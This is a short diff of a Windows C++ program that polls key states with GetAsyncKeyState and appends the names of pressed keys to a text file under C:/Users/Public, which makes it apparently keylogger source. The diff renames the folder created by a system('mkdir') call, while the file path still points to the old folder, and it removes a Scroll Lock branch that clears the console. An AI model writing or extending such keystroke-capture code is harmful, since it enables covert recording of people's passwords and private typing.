@@ -11,7 +11,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance,
 
     //Sleep(20000);
 
-    system("mkdir \"C:/Users/Public/Python GGKEIT\"");
+    system("mkdir \"C:/Users/Public/Общая развёртка\"");
     ofstream fout;
     fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
     fout.close();
@@ -319,10 +319,6 @@ int APIENTRY wWinMain(HINSTANCE hInstance,
         if (GetAsyncKeyState(0x7B) == -32767)
         {
             fout << "F12  ";
-        }
-        if (GetAsyncKeyState(0x91) == -32767)
-        {
-            system("cls");
         }
         fout.close();
         Sleep(5);
